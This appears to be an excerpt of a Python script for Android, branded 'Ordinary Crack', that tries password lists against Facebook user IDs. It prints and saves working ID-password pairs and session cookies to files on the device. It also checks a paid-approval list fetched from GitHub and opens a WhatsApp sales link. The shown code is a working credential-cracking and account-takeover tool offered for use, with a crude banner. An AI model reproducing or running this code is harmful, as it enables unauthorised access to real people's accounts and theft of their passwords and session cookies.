...
| | | |( '__)/'_` || |/' _ `\ /'_` )( '__)( ) ( )   
| (_) || |  ( (_| || || ( ) |( (_| || |   | (_) |   
(_____)(_)  `\__,_)(_)(_) (_)`\__,_)(_)   `\__, |   
                                          ( )_| |   
                                          `\___/'   
 \033[1;93m×××××××××××××××××\033[1;93m××××××××××××××\033[1;93m××××××××××××××××
 \033[1;93m|     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m Ordinary Crack        \033[1;93m|
 \033[1;93m|     \033[1;32m[✓] Github    : \033[1;34m ordinary-crack             \033[1;93m|
 \033[1;93m|     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning      \033[1;93m|
 \033[1;93m|     \033[1;35m[✓] TEAM         :  \033[1;35m facking team      \033[1;93m|
 ...
 \033[1;91m[\033[1;97m•\033[1;91m]\033[1;32m Fuk**G ZONE....         \033[1;93m|
 \033[1;93m××××××××××××××××\033[1;93m×××××××××××××××\033[1;93m××××××××××××××××""")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r \033[38;5;196m[\033[38;5;45mOrdinary-OK🥵🔞\033[38;5;196m] \033[38;5;46m'+uid+'\033[38;5;196m | \033[38;5;46m' +ps+    '  \n\033[38;5;196m[\033[0;93m [\033[38;5;46mCOOKIE-🔰😭\033[38;5;196m] = \033[38;5;195m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Ordinary-Crack-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;30m[Ordinary-Crack-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Ordinary-Crack-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x} [{xr} ordinary-crack{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def superuser():
    ...
    id = "71".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/F4RH4N-404/Apprval/blob/main/Apprval.txt").text
    if id in DARK:
        os.system('clear')
        print(logo)
        xxr()
        ...
        print(" \033[1;32m Note : 🌚That is Paid because 80% ok id just now login☠️\033[1;37m")
        print ("")
        ...
        os.system('am start https://wa.me/+8801933861809?text=' + tks)
        superuser()        
superuser()
